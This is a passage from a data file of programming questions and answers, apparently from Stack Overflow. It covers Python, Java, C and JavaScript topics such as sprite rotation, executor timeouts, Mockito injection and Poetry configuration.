        image.anchor_x, image.anchor_y = self.sptiteWidth // 2, self.spriteHeight // 2
        self.sprite = Sprite(image, x = window_width // 2, y = window_height // 2, batch=self.batch)
        self.angle = 0
        self.rotate = False
# LABEL       
        self.label = Label(
            color=(255, 255, 255),
            font_name ='Times New Roman',
            font_size = 22,
            x = self.width // 2, y = self.height // 4,
            anchor_x ='center', anchor_y ='center')   


    def update(self, dt):
        self.label.text = f'MOUSE ANGLE: {self.angle} || SPRITE ANGLE: {self.sprite.rotation}'
        if self.rotate:
            rotationSpeed = 1
            if self.sprite.rotation != self.angle:
                if self.sprite.rotation < self.angle:    
                    self.sprite.rotation += rotationSpeed
                else: 
                    self.sprite.rotation -= rotationSpeed  
 

    def on_mouse_press(self, x, y, button, modifiers):
        if button == mouse.LEFT:
            self.angle = trunc(degrees(atan2(x - self.sprite.x, y - self.sprite.y)))
            # if self.angle < 0:
            #    self.angle += 360
            self.rotate = True

    
    def on_draw(self):
        self.clear()
        self.batch.draw()
        self.label.draw()


if __name__ == ""__main__"":
    fps = 60
    main = MAIN()
    schedule_interval(main.update, 1 / fps)
    run()

","If your intention is to just make your sprite spin in the direction that would get you to the target fastest, then the code is heavily logic-based. Thus, I'll refer to a diagram to help with explaining.
Here, since you are working with -180 to 180, you want to firstly figure out this:

To do this, we need to figure out whether the ""difference"" is less than 180, which would be the upper area (-180 to 180 zone). If it isn't, then that means that it would be faster to work on the bottom area (cross the -180 and 180 border).
Now, we don't actually know which angle is the left angle and which one is the right angle yet. To do this, we simply ask, which one is greater?
So then,

If working on the top and the left angle is the sprite angle, we move clockwise
If top and the right angle is the sprite angle, we move counterclockwise
If working on the bottom and the left angle is the sprite angle, we move counterclockwise
If bottom and the right angle is the sprite angle, we move clockwise

We also need to take into account that when we cross the -180 and 180 borderline, we need to convert depending on the direction we're going (-180 to 180, 180 to -180).
def update(self, dt):
        self.label.text = f'MOUSE ANGLE: {self.angle} || SPRITE ANGLE: {self.sprite.rotation}'
        if self.rotate:
            rotationSpeed = 1
            if self.sprite.rotation != self.angle:
#New code
                if abs(self.sprite.rotation-self.angle) < 180:
                    if self.sprite.rotation > self.angle:
                        self.sprite.rotation -= rotationSpeed
                    else:
                        self.sprite.rotation += rotationSpeed
                else:
                    if self.sprite.rotation > self.angle:
                        self.sprite.rotation += rotationSpeed 
                    else:
                        self.sprite.rotation -= rotationSpeed

            if self.sprite.rotation > 180: self.sprite.rotation = -180
            if self.sprite.rotation < -180: self.sprite.rotation = 180
#Your old code
                # if self.sprite.rotation < self.angle:
                #     self.sprite.rotation += rotationSpeed
                # else: 
                #     self.sprite.rotation -= rotationSpeed

",python
java  execute multiple runnables in parallel and trigger to timeout some of long running tasks,"I've a list of Runnable tasks (e.g. it contains 100 tasks, and each task takes randomly 1 - 10 seconds). The tasks must run in parallel and from the thread pool provided by ExecutorService (e.g. my system has 4 CPUs, then it should run 4 tasks at the same time).
The question is: I wanted to know which tasks took longer than 5 seconds to run from the list of 100 tasks and they should be terminated (with logs of task ids) after 5 seconds to have places for other tasks.
I've looked at Future with executorService.submit(Runnable task) but the Future.get() method will block the main thread and it is not what I wanted. Any suggestions would be great.
public class TestExecutorService {

    private static final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors() * 10);

    public static void main(String[] args) throws InterruptedException {
        List<Callable<Object>> tasks = new ArrayList<>();

        for (int i = 0; i < 100; i++) {
            int finalI = i;
            int min = 1;
            int max = 8;

            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    try {
                        int sleepTime = min + (int)(Math.random() * ((max - min) + 1));
                        System.out.println(""## Thread: "" + finalI + "" will sleep: "" + sleepTime + "" seconds."");
                        Thread.sleep(sleepTime * 1000);
                        System.out.println(""## Thread: "" + finalI + "" finished after: "" + sleepTime + "" seconds"");
                    } catch (InterruptedException e) {
                        System.out.println(""Thread is cancelled!"");
                    }
                }
            };

            tasks.add(Executors.callable(runnable));
        }

        // How to make a Runnable task timeout after 5 seconds when running other tasks in parallel
        // instead of total time for 100 tasks in 5 seconds?
        executorService.invokeAll(tasks, 5, TimeUnit.SECONDS);

        executorService.shutdown();
    }
}

","Lets say you have some list of tasks, and an Executor to
List<Runnable> tasks = ...;
ExecutorService executor = ...;

Now you want to perform each task, get the time it takes, and cancel the task if it takes too long. I would suggest scheduling a time out action.
ScheduledExecutorService timeoutService = Executors.newSingleThreadScheduledExecutor();

Now when you're submitting your tasks.
List<Future<Long>> results = new ArrayList<>();
for(int i = 0; i<tasks.size(); i++){
    Runnable task = tasks.get(i);
    Future<Long> future = executor.submit( () ->{
        long start = System.currentTimeMillis();
        task.run();
        return System.currentTimeMillis() - start;
    });
    Future<?> timeout = timeoutService.schedule( ()->{
        if(!future.isDone()){
            future.cancel(true);
        }
    }, 5, TimeUnit.SECONDS);
    results.add(future);
}

Now you can just go through results and call get when all of the tasks have finished, either exceptionally or normally, you will finish going through the results list. This assumes your tasks can be cancelled or interrupted If they cannot, then you can use the timeout futures.
",java
implementing two interfaces in a class with same method which interface method is overridden,"Two interfaces with same method names and signatures. But implemented by a single class then how the compiler will identify the which method is for which interface?
Ex:
interface A{
  int f();
}

interface B{
  int f();
}

class Test implements A, B{   
  public static void main(String... args) throws Exception{   

  }

  @Override
  public int f() {  // from which interface A or B
    return 0;
  }
}   

","If a type implements two interfaces, and each interface define a method that has identical signature, then in effect there is only one method, and they are not distinguishable. If, say, the two methods have conflicting return types, then it will be a compilation error. This is the general rule of inheritance, method overriding, hiding, and declarations, and applies also to possible conflicts not only between 2 inherited interface methods, but also an interface and a super class method, or even just conflicts due to type erasure of generics.

Compatibility example
Here's an example where you have an interface Gift, which has a present() method (as in, presenting gifts), and also an interface Guest, which also has a present() method (as in, the guest is present and not absent).
Presentable johnny is both a Gift and a Guest.
public class InterfaceTest {
    interface Gift  { void present(); }
    interface Guest { void present(); }

    interface Presentable extends Gift, Guest { }

    public static void main(String[] args) {
        Presentable johnny = new Presentable() {
            @Override public void present() {
                System.out.println(""Heeeereee's Johnny!!!"");
            }
        };
        johnny.present();                     // ""Heeeereee's Johnny!!!""

        ((Gift) johnny).present();            // ""Heeeereee's Johnny!!!""
        ((Guest) johnny).present();           // ""Heeeereee's Johnny!!!""

        Gift johnnyAsGift = (Gift) johnny;
        johnnyAsGift.present();               // ""Heeeereee's Johnny!!!""

        Guest johnnyAsGuest = (Guest) johnny;
        johnnyAsGuest.present();              // ""Heeeereee's Johnny!!!""
    }
}

The above snippet compiles and runs.
Note that there is only one @Override necessary!!!. This is because Gift.present() and Guest.present() are ""@Override-equivalent"" (JLS 8.4.2).
Thus, johnny only has one implementation of present(), and it doesn't matter how you treat johnny, whether as a Gift or as a Guest, there is only one method to invoke.

Incompatibility example
Here's an example where the two inherited methods are NOT @Override-equivalent: 
public class InterfaceTest {
    interface Gift  { void present(); }
    interface Guest { boolean present(); }

    interface Presentable extends Gift, Guest { } // DOES NOT COMPILE!!!
    // ""types InterfaceTest.Guest and InterfaceTest.Gift are incompatible;
    //  both define present(), but with unrelated return types""
}

This further reiterates that inheriting members from an interface must obey the general rule of member declarations. Here we have Gift and Guest define present() with incompatible return types: one void the other boolean. For the same reason that you can't an void present() and a boolean present() in one type, this example results in a compilation error.

Summary
You can inherit methods that are @Override-equivalent, subject to the usual requirements of method overriding and hiding. Since they ARE @Override-equivalent, effectively there is only one method to implement, and thus there's nothing to distinguish/select from. 
The compiler does not have to identify which method is for which interface, because once they are determined to be @Override-equivalent, they're the same method.
Resolving potential incompatibilities may be a tricky task, but that's another issue altogether.
References

JLS 8.4.2 Method Signature
JLS 8.4.8 Inheritance, Overriding, and Hiding
JLS 8.4.8.3 Requirements in Overriding and Hiding
JLS 8.4.8.4 Inheriting Methods with Override-Equivalent Signatures

""It is possible for a class to inherit multiple methods with override-equivalent signatures.""


",java
printf gives different results for long double under valgrind,"I have a simple test application below which prints a double and a long double using printf.
#include <stdio.h>

int main()
{
    printf(""%f\n"", 1.2345675);
    printf(""%Lf\n"", 1.2345675L);
    return 0;
}

$ gcc main.c
$ ./a.out


1.234568
1.234567


If I run this under valgrind, the long double is printed as if it were a double.
$ valgrind --quiet ./a.out


1.234568
1.234568         <------- why not 1.234567?


I am using valgrind 3.19.0
$ valgrind --version
valgrind-3.19.0


Why is this happening?
Is there any way for me to enable long double support under valgrind?


Edit:
Per request by @chux I have added printing using %a / %La (the details of which can be found in this SO answer)
Unfortunately I still get different results:
Without valgrind:
0x1.3c0c9d9d3458dp+0
0x9.e064ece9a2c669p-3

With valgrind:
0x1.3c0c9d9d3458dp+0
0x9.e064ece9a2c68p-3

The long double still loses precision:
0x9.e064ece9a2c669p-3   (native x86-64)
0x9.e064ece9a2c68p-3    (valgrind)
                ^^

","This is normal
Valgrind's floating-point emulation may treat long double as a double under the hood. This behavior occurs because the long double type requires extended precision (80-bit or higher, depending on the architecture), which valgrind doesn't fully emulate by default.
Different Behavior with and without valgrind:
Without valgrind, your application uses the native hardware floating-point unit (FPU), which correctly handles long double precision.
Under valgrind, the FPU instructions are emulated, and due to limitations or bugs in the emulation layer, long double values may be truncated to double.

Valgrind has the following limitations in its implementation of x86/AMD64 floating point relative to IEEE754.
Precision: There is no support for 80 bit arithmetic. Internally, Valgrind represents all such ""long double"" numbers in 64 bits, and so there may be some differences in results. Whether or not this is critical remains to be seen. Note, the x86/amd64 fldt/fstpt instructions (read/write 80-bit numbers) are correctly simulated, using conversions to/from 64 bits, so that in-memory images of 80-bit numbers look correct if anyone wants to see.
The impression observed from many FP regression tests is that the accuracy differences aren't significant. Generally speaking, if a program relies on 80-bit precision, there may be difficulties porting it to non x86/amd64 platforms which only support 64-bit FP precision. Even on x86/amd64, the program may get different results depending on whether it is compiled to use SSE2 instructions (64-bits only), or x87 instructions (80-bit). The net effect is to make FP programs behave as if they had been run on a machine with 64-bit IEEE floats, for example PowerPC. On amd64 FP arithmetic is done by default on SSE2, so amd64 looks more like PowerPC than x86 from an FP perspective, and there are far fewer noticeable accuracy differences than with x86.

(https://valgrind.org/docs/manual/manual-core.html)
",c
how to know if mac platform is macosx64 or macosaarch64,"I am trying to download JDK from Amazon Corretto https://docs.aws.amazon.com/corretto/latest/corretto-11-ug/downloads-list.html. There are 2 download links for macOS (macOSx64 or macOSaarch64) but I am not sure which one should be downloaded. I am using macOS Monterey Version 12.0.1
","You can run the following command to get that
uname -a

Having x64 in there might give you a hint.
",java
python 33 mysql connector,"
Possible Duplicate:
MySQL-db lib for Python 3.0? 

I use python3.3 and can't connect to MySQL, because I don't find module for MySQL connector.
How do I connect to MySQL with python3.3?
","There is a module called Pymysql which you may like:
""""""This pure Python MySQL client provides a DB-API to a MySQL database by talking directly to the server via the binary client/server protocol.""""""

import pymysql
conn = pymysql.connect(host='127.0.0.1', unix_socket='/tmp/mysql.sock', user='root', passwd=None, db='mysql')
cur = conn.cursor()
cur.execute(""SELECT Host,User FROM user"")
for response in cur:
    print(response)
cur.close()
conn.close()

",python
summing a nested property using the java stream api,"I have the following Java POJOs:
public class Order {
    private List<OrderLine> orderLines;
    private String name;
    // ... lots of other fields

    // Getters & setters & ctors down here
}

public class OrderLine {
    private String productId;
    private Integer quantity;

    // Getters & setters & ctors down here
}

I'm trying to find a Java 8 ""Streamy"" way of grabbing the total quantity of all orderlines in an order. The ""old"" way of grabbing this count would look like this:
int totalQuantity = 0;
for (OrderLine ol : order.getOrderLines()) {
    totalQuantity += ol.getQuantity();  
}

My best attempt so far:
Integer totalQuantity = order.getOrderLines().stream().filter(ol -> ol.getQuantity());

I know this is wrong since its not iterating through the List<OrderLine> and summing each line's quantity, and it doesn't compile since filter(...) needs the expression to resolve to a boolean, not an int value.
Any ideas where I'm going awry?
","You are looking for Stream.mapToInt(), which creates an IntStream and IntStream.sum(). You can try this:
int totalQuantity = order.getOrderLines().stream()
        .mapToInt(OrderLine::getQuantity)
        .sum();

This will sum up the total quality of all order lines from an order.
",java
orgspringframeworkbeansfactorybeancreationexception while try to connect my mongodb cloud data base to my spring application,"I was trying to create my basic spring application and try to connect to my MongoDB database.
so a create my entity
import lombok.*;
import org.springframework.data.annotation.Id;
import org.springframework.data.mongodb.core.mapping.Document;

@Document
    @Data @AllArgsConstructor @NoArgsConstructor @ToString
    public class MyProduct {
    @Id
    private String id;
    private String name;
    private int price;
}

my repository
import com.nizar.back.demo.entities.MyProduct;
import org.springframework.data.mongodb.repository.MongoRepository;
import org.springframework.data.rest.core.annotation.RepositoryRestResource;

@RepositoryRestResource
public interface MyProductRepository extends MongoRepository<MyProduct,String> {
}

my application.properties
server.port=8093
spring.data.mongodb.uri=mongodb://<my username>:<my password>@cluster0.zgrrb.mongodb.net/appDatabase?retryWrites=true&w=majority

and this is my application class
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration;
import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;
import org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration;

@SpringBootApplication
@EnableAutoConfiguration(exclude={ DataSourceAutoConfiguration.class, MongoAutoConfiguration.class, MongoDataAutoConfiguration.class})
public class DemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }

}

what i notice that i have this error when i try to run my application, and i didn't understant why ?
2021-07-21 18:04:49.921  INFO 7524 --- [           main] com.nizar.back.demo.DemoApplication      : Starting DemoApplication using Java 1.8.0_291 on DESKTOP-6PB4U74 with PID 7524 (C:\dev projects\spring project\demo\target\classes started by abdel in C:\dev projects\spring project\demo)
2021-07-21 18:04:49.924  INFO 7524 --- [           main] com.nizar.back.demo.DemoApplication      : No active profile set, falling back to default profiles: default
2021-07-21 18:04:50.411  INFO 7524 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data MongoDB repositories in DEFAULT mode.
2021-07-21 18:04:50.459  INFO 7524 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 43 ms. Found 1 MongoDB repository interfaces.
2021-07-21 18:04:50.724  WARN 7524 --- [           main] s.c.a.AnnotationConfigApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'myProductRepository' defined in com.nizar.back.demo.dao.MyProductRepository defined in @EnableMongoRepositories declared on MongoRepositoriesRegistrar.EnableMongoRepositoriesConfiguration: Cannot resolve reference to bean 'mongoTemplate' while setting bean property 'mongoOperations'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No bean named 'mongoTemplate' available
2021-07-21 18:04:50.732  INFO 7524 --- [           main] ConditionEvaluationReportLoggingListener : 

Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled.
2021-07-21 18:04:50.749 ERROR 7524 --- [           main] o.s.b.d.LoggingFailureAnalysisReporter   : 

***************************
APPLICATION FAILED TO START
***************************

Description:

A component required a bean named 'mongoTemplate' that could not be found.

I just did this project to learn about spring boot. and i just need to find why i have this error and how i can solve it
","it didn't choose the right version of the driver.
so I change the drive version on https://cloud.mongodb.com/ to 3.4 or later and it give me an other url to connect and it work
mongodb://<MyUsername>:<Mypassword>@cluster0-shard-00-00.zgrrb.mongodb.net:27017,cluster0-shard-00-01.zgrrb.mongodb.net:27017,cluster0-shard-00-02.zgrrb.mongodb.net:27017/myFirstDatabase?ssl=true&replicaSet=atlas-sr24zl-shard-0&authSource=admin&retryWrites=true&w=majority

",java
why do we use zero length array instead of pointers,"It's said that zero length array is for variable length structure, which I can understand. But what puzzle me is why we don't simply use a pointer, we can dereference and allocate a different size structure in the same way.
EDIT - Added example from comments
Assuming:
struct p
{
    char ch;
    int *arr;
};

We can use this:
struct p *p = malloc(sizeof(*p) + (sizeof(int) * n));

p->arr = (struct p*)(p + 1);

To get a contiguous chunk of memory.  However, I seemed to forget the space p->arr occupies and it seems to be a disparate thing from the zero size array method.
","These are various forms of the so-called ""struct hack"", discussed in question 2.6 of the comp.lang.c FAQ.
Defining an array of size 0 is actually illegal in C, and has been at least since the 1989 ANSI standard. Some compilers permit it as an extension, but relying on that leads to non-portable code.
A more portable way to implement this is to use an array of length 1, for example:
struct foo {
    size_t len;
    char str[1];
};

You could allocate more than sizeof (struct foo) bytes, using len to keep track of the allocated size, and then access str[N] to get the Nth element of the array. Since C compilers typically don't do array bounds checking, this would generally ""work"". But, strictly speaking, the behavior is undefined.
The 1999 ISO standard added a feature called ""flexible array members"", intended to replace this usage:
struct foo {
    size_t len;
    char str[];
};

You can deal with these in the same way as the older struct hack, but the behavior is well defined. But you have to do all the bookkeeping yourself; sizeof (struct foo) still doesn't include the size of the array, for example.
You can, of course, use a pointer instead:
struct bar {
    size_t len;
    char *ptr;
};

And this is a perfectly good approach, but it has different semantics.  The main advantage of the ""struct hack"", or of flexible array members, is that the array is allocated contiguously with the rest of the structure, and you can copy the array along with the structure using memcpy (as long as the target has been properly allocated). With a pointer, the array is allocated separately -- which may or may not be exactly what you want.
",c
how to load a huggingface dataset from local path,"Take a simple example in this website, https://huggingface.co/datasets/Dahoas/rm-static:
if I want to load this dataset online, I just directly use,
from datasets import load_dataset
dataset = load_dataset(""Dahoas/rm-static"") 

What if I want to load dataset from local path, so I download the files and keep the same folder structure from web Files and versions fristly,
-data
|-test-00000-of-00001-bf4c733542e35fcb.parquet
|-train-00000-of-00001-2a1df75c6bce91ab.parquet
-.gitattributes
-README.md
-dataset_infos.json

Then, put them into my folder, but shows error when loading:
dataset_path =""/data/coco/dataset/Dahoas/rm-static""
tmp_dataset = load_dataset(dataset_path)

It shows FileNotFoundError: No (supported) data files or dataset script found in /data/coco/dataset/Dahoas/rm-static.
","Save the data with save_to_disk then load it with load_from_disk. For example:
import datasets
ds = datasets.load_dataset(""Dahoas/rm-static"") 
ds.save_to_disk(""Path/to/save"")

and later if you wanna re-utilize it just normal load_dataset will work
ds = datasets.load_from_disk(""Path/to/save"")

you can verify the same by printing the dataset you will be getting same result for both. This is the easier way out. The file format it is generally saved in is arrow.
For the second method where you are downloading the parquet file. Would require you to explicitly declaring the dataset and it config, might be included in json and then you can load it.
",python
how to call an async function inside useeffect in react,"I would like to call an async function and get the result for my UseEffect.
The fetch api examples I found on the internet are directly made in the useEffect function.
If my URL changes, I must patch all my fetchs.
When I tried, I got an error message.
This is my code.

    async function getData(userId) {
        const data = await axios.get(`http://url/api/data/${userId}`)
            .then(promise => {
                return promise.data;
            })
            .catch(e => {
                console.error(e);
            })
            return data;
    }
    

    function blabla() {
        const [data, setData] = useState(null);
    
        useEffect(async () => {
            setData(getData(1))
        }, []);
    
        return (
            <div>
                this is the {data[""name""]}
            </div>
        );
    }



index.js:1375 Warning: An effect function must not return anything besides a function, which is used for clean-up.
It looks like you wrote useEffect(async () => ...) or returned a Promise. Instead, write the async function inside your effect and call it immediately:

useEffect(() => {
  async function fetchData() {
    // You can await here
    const response = await MyAPI.getData(someId);
    // ...
  }
  fetchData();
}, [someId]); // Or [] if effect doesn't need props or state

","Create an async function inside your effect that wait the getData(1) result then call setData():
useEffect(() => {
  const fetchData = async () => {
     const data = await getData(1);
     setData(data);
  }

  fetchData();
}, []);

",javascript
removing index column in pandas when reading a csv,"I have the following code which imports a CSV file.  There are 3 columns and I want to set the first two of them to variables.  When I set the second column to the variable ""efficiency"" the index column is also tacked on.  How can I get rid of the index column?
df = pd.DataFrame.from_csv('Efficiency_Data.csv', header=0, parse_dates=False)
energy = df.index
efficiency = df.Efficiency
print efficiency

I tried using 
del df['index']

after I set 
energy = df.index

which I found in another post but that results in ""KeyError: 'index' ""
","DataFrames and Series always have an index. Although it displays alongside the column(s), it is not a column, which is why del df['index'] did not work.
If you want to replace the index with simple sequential numbers, use df.reset_index(). 
To get a sense for why the index is there and how it is used, see e.g. 10 minutes to Pandas. 
",python
error generated while creating a nextjs project,"Good morning, I am a student in software programming, and this is my last session. We are taking a course on web programming with Next.js. During the installation, I encountered errors, which are shown in the screenshots. The errors are related to missing dependencies and several other issues. The error messages are too long.
This are my versions:
PS C:...\Desktop\Seesion 4\WebServer\nextjs>
PS C:...\Desktop\Seesion 4\WebServer\nextjs> npm -v
11.0.0
PS C:...\Desktop\Seesion 4\WebServer\nextjs> nvm -v
1.2.2
PS C:...\Desktop\Seesion 4\WebServer\nextjs> node -v
v22.13.0
PS C:...Desktop\Seesion 4\WebServer\nextjs> nvm list
22.13.0 (Currently using 64-bit executable)
PS C:\Users\abots\Desktop\Seesion 4\WebServer\nextjs>
I encountered these warnings and errors during installation:
(node:5052) [DEP0040] DeprecationWarning: The punycode module is deprecated. Please use a userland alternative instead.
(Use node --trace-deprecation ... to show where the warning was created)
npm WARN peerDependencies The peer dependency typescript@>=3.3.1 included from eslint-config-next will no
npm WARN peerDependencies longer be automatically installed to fulfill the peerDependency
npm WARN peerDependencies in npm 3+. Your application will need to depend on it explicitly.
npm WARN peerDependencies The peer dependency eslint-plugin-import-x@* included from eslint-import-resolver-typescript will no
npm WARN peerDependencies longer be automatically installed to fulfill the peerDependency
npm WARN peerDependencies in npm 3+. Your application will need to depend on it explicitly.
npm WARN peerDependencies The peer dependency typescript@>=4.8.4 <5.8.0 included from @typescript-eslint/parser will no
npm WARN peerDependencies longer be automatically installed to fulfill the peerDependency
npm WARN peerDependencies in npm 3+. Your application will need to depend on it explicitly.
npm WARN peerDependencies The peer dependency ts-node@>=9.0.0 included from postcss-load-config will no
npm WARN peerDependencies longer be automatically installed to fulfill the peerDependency
npm WARN peerDependencies in npm 3+. Your application will need to depend on it explicitly.
Please what is the issue?
I tried everything possible, i changed versions, reinstall everything, i spent all my night on it.
","I see 3 issues

make sure next.js is compatible with Node.js versions like 18.x or 20.x
Install Peer Dependencies Manually npm install typescript eslint-plugin-import eslint-plugin-react eslint-plugin-jsx-a11y ts-node --save-dev 
There is Deprecated Punycode Module so install npm install --legacy-peer-deps 

",javascript
junit testing error in java eclipse set up quotwhenquot does not work,"In the setup in my test, the line:
when(kc.getToken()).thenReturn(token);   

does not work and I get the following error from the ServiceImplementation:
java.lang.NullPointerException: Cannot invoke ""services.KeycloakService.getToken()"" because ""this.kc"" is null

I am using the following dependencies:
testImplementation 'org.springframework.boot:spring-boot-starter-test'
testImplementation 'org.mockito:mockito-core:5.14.2'
testImplementation 'org.mockito:mockito-junit-jupiter:5.14.2'

WHAT I TRIED:

run the testMockInjection: all tests are green.
run the testUpdate: I see that the code from the Service implementation stops in the line

String zaToken = kc.getToken

and gives the aforementioned error

the message in the set up is printed as expected
I tried using a spy instead of a mock but it did not work again. Also, as I understand, It is better to use the mock because I want to 'fake' the whole service and need to stub just one function.
Test import is the correct one
I am using @ExtendWith(MockitoExtension.class), @BeforeEach and @InjectMocks which work in my other tests.

However, I also tried  MockitoAnnotations.initMocks(this) and the error remained.
SERVICE IMPLEMENTATION CODE
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
...
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
...
import services.AasService;
import services.KeycloakService;
 
@Service
public class AasServiceImpl implements AasService{
    private final RestTemplate restTemplate;
    
    @Autowired
    private KeycloakService kc;

    @Value(""${ass.server}"")
    private String aasUri;
    @Value(""${ass.id}"")
    private String aasIdShort;
    
    public AasServiceImpl (RestTemplate restTemplate) {
        this.restTemplate = restTemplate;
    }
    
    @Override
    public void update(String applicationUri, String nodeId, JSONObject value) {
        System.out.println(applicationUri);
        System.out.println(nodeId);
        System.out.println(value);

        String submodelElementValueId = applicationUri.replace("":"", ""_"") + nodeId.replace(""i="", """");
        
        System.out.println(submodelElementValueId);
        
        if (kc instanceof KeycloakServiceImpl) {
            System.out.println(""This is original service."");
        } else {
            System.out.println(""This is  not the original service."");
//this is the option printed 

        }
//problematic line is the following                 
        String zaToken = kc.getToken();
        
//this is not printed in the code 
        System.out.println(zaToken);
        try {
            updateValue(""DefectDetectionSkill"", ""Inputs"", submodelElementValueId, value, zaToken);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
    }
}

TEST CODE:
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doReturn;
import static org.mockito.Mockito.when;
...
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.mockito.MockitoAnnotations;
import org.mockito.Spy;
import org.mockito.junit.jupiter.MockitoExtension;
...
import org.junit.jupiter.api.BeforeEach;
import services.KeycloakService;  //this is an interface

@ExtendWith(MockitoExtension.class)
public class AasServiceImplTest {

    @Mock
    private KeycloakService kc;
    
    @Mock
    private RestTemplate restTemplate;
        
    @InjectMocks
    private AasServiceImpl aasService;

    @BeforeEach
    void setUp() {
       
        String token = ""mockToken"";
        when(kc.getToken()).thenReturn(token);

        ResponseEntity<String> response= new ResponseEntity<>("""", HttpStatus.OK);
        when(restTemplate.exchange(anyString(), any(), any(), eq(String.class))).thenReturn(response);
 
        System.out.println(""set up runs"");
        //this message is printed
    }

    /*
    @Test
    void testMockInjection() {
        
        assertNotNull(kc, ""KeycloakService mock is not injected!"");
        assertNotNull(restTemplate, ""RestTemplate mock is not injected!"");
        assertNotNull(aasService, ""AasServiceImpl is not initialized!"");
    }
    
    */
    @Test
    void testUpdate() {
        
        //Arrange
        String applicationUri = ""http://mock_uri"";
        String nodeId=""i=ioanna"";
        JSONObject value = new JSONObject();
        value.put(""Value"", 1234);

        //Act
        aasService.update(applicationUri,  nodeId , value);
        System.out.println(""Value: "" + value.get(""Value""));

        //Assert
        assertNotNull(kc, ""KeycloakService mock is not injected!"");

        //verify(kc, times(1)).getToken();
        //verify(restTemplate, atLeastOnce()).exchange(anyString(), any(), any(), eq(String.class));
    }

","It seems like @InjectMock is failing to mix field injection and constructor argument injection. Either have both the restTemplate and kc fields autowired:
@Service
public class AasServiceImpl implements AasService {
    // No explicit constructor!

    @Autowired
    private  RestTemplate restTemplate;

    @Autowired
    private KeycloakService kc;
    ...

Or have them both as constructor arguments:
@Service
public class AasServiceImpl implements AasService {
    private  RestTemplate restTemplate;
    private KeycloakService kc;


    public AasServiceImpl (RestTemplate restTemplate, KeycloakService kc) {
        this.restTemplate = restTemplate;
        this.kc = kc;
    }
    ...

",java
django  can a crispy form be split into 2 columns,"I'm trying to split a crispy layout form into 2 columns to try and eradicate the need to scroll, I've tried to use formhelper in forms.py to put 2 questions in a DIV but that doesn't change anything. Does anyone have any ideas? 
forms.py
from crispy_forms.helper import FormHelper
from crispy_forms.layout import Layout, Div, Field, Row, Submit, Button, Column

class ProfileUpdateForm(forms.ModelForm):
    address = forms.CharField()
    dob = forms.DateField(
        widget=forms.TextInput(
            attrs={'type': 'date'}
        ), label='Date of Birth'
    )
    def __init__(self, *args, **kwargs):
        self.helper = FormHelper()
        self.helper.layout = Layout(
            Div(
                Div(Field('fullname'), css_class='col-md-6',),
                Div(Field('dob'), css_class='col-md-6',),
                css_class='row',
            ),
            Div(
                Div(Field('address'), css_class='col-md-6',),
                Div(Field('city'), css_class='col-md-6',),
                css_class='row',
            ),
            Div(
                Div(Field('country'), css_class='col-md-6',),
                Div(Field('profilephoto'), css_class='col-md-6',),
                css_class='row',
            ),
        )
        super(ProfileUpdateForm, self).__init__(*args, **kwargs)
    class Meta:
        model = Profile
        fields = ['fullname', 'dob', 'address', 'city', 'country', 'profilephoto']
        labels = {
            'fullname': 'Full Name',
            'address': 'Address',
            'city': 'City',
            'country': 'Country',
            'profilephoto': 'Profile Photo',
        }

views.py
@login_required
def profile(request):
    if request.method == 'POST':
        u_form = UserUpdateForm(request.POST, instance=request.user)
        p_form = ProfileUpdateForm(request.POST, request.FILES, instance=request.user.profile)

        if u_form.is_valid and p_form.is_valid:
            u_form.save()
            p_form.save()
            messages.success(request, f'Your account has been successfully updated!')
            return redirect('profile')
    else:   
        u_form = UserUpdateForm(instance = request.user)
        p_form = ProfileUpdateForm(instance = request.user.profile)

    context = {
        'u_form': u_form,
        'p_form': p_form
    }
    return render(request, 'users/profile.html', context)

profile.html
{% load crispy_forms_tags %}

            <form method=""POST"" enctype=""multipart/form-data"">
                {% csrf_token %}
                {{ u_form|crispy }}

                {{ p_form|crispy }}

           </form>

Current State

EDIT Added __init__ to forms.py
","Actually, I'm not even sure if your helper is picked up. Based on the documentation here the formhelper should be added at __init__. And your issue could also be in your template if you don't use {% crispy your_cool_form_name %} there.
You're almost there. You're looking for Field.
from crispy_forms.layout import Field

[...]


Div(
    Div(Field('fullname'), css_class='col-md-6',),
    Div(Field('dob'), css_class='col-md-6',),
    css_class='row',
),

",python
poetry no filefolder for package,"I have a simple project layout
myproject on  main [$!?] is 📦 v1.0.0 via  v18.14.0 via 🐍 v3.10.9 
❯ tree -L 1
.
├── build
├── deploy
├── Dockerfile
├── poetry.lock
├── pyproject.toml
├── README.md
├── scripts.py
└── src

The pyproject.toml is:
[tool.poetry]
name = ""myproject""
version = ""0.1.0""
description = """"
authors = [""""]

[tool.poetry.scripts]
test = ""scripts:test""

The scripts.py is:
import subprocess

def test():
    """"""
    Run all unittests.
    
    """"""
    subprocess.run(
        ['python', '-u', '-m', 'pytest']
    )
if __name__ == '__main__':
    test()

When I run poetry run test:
myproject on  main [$!?] is 📦 v1.0.0 via  v18.14.0 via 🐍 v3.10.9 

No file/folder found for package myproject

","Short answer:
The directory where your pyproject.toml file sits needs to be share the same name, e.g., if the name config in pyproject.toml is name = ""myproject"", the directory needs to be also named myproject. Therefore, you must either:

Rename the directory to match your name configuration in the pyproject.toml or
